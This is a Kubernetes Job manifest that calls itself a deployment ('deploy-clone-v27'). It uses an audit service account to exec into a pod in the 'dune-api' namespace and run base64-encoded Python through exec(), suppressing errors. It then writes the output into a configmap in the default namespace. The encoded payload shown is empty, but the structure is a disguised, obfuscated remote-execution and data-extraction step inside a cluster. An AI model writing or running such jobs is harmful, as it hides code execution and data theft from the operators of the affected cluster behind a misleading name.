apiVersion: batch/v1
kind: Job
metadata:
  name: deploy-clone-v27
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: runner
        image: bitnami/kubectl:latest
        command: ["/bin/sh", "-c"]
        args:
        - |
          POD=$(kubectl get pod -n dune-api -o jsonpath='{.items[0].metadata.name}')
          RAW=$(kubectl exec -n dune-api "$POD" -- python3 -c "exec(__import__('base64').b64decode('').decode())" 2>/dev/null || true)
          RESULT=$(echo "$RAW" | tail -1)
          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"deploy_clone\":\"${RESULT}\"}}"